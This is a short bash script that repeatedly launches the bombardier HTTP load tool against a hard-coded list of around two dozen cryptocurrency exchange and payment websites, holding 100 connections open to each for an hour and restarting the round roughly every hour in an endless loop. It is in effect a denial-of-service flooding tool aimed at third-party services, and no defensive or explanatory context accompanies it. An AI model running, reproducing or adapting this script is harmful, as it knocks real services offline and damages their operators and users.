#!/bin/bash -x

DESTS=( "https://cleanbtc.ru/""https://bonkypay.com" "https://changer.club" "https://superchange.net" "https://mine.exchange" "https://platov.co" "https://ww-pay.net" "https://delets.cash" "https://betatransfer.org" "https://ramon.money" "https://coinpaymaster.com"  "https://bitokk.biz" "https://www.netex24.net" "https://flashobmen.com" "https://abcobmen.com" "https://ychanger.net" "https://multichange.net" "https://24paybank.net" "https://royal.cash" "https://prostocash.com" "https://baksman.org" "https://kupibit.me" "https://abcobmen.com")
TIME="60m"
CONNACTIONSPERTARGET=100

while true
do
    for DEST in ${DESTS[@]}
    do
        bombardier -c $CONNACTIONSPERTARGET -d $TIME -l $DEST &
    done
	sleep 3550s
done
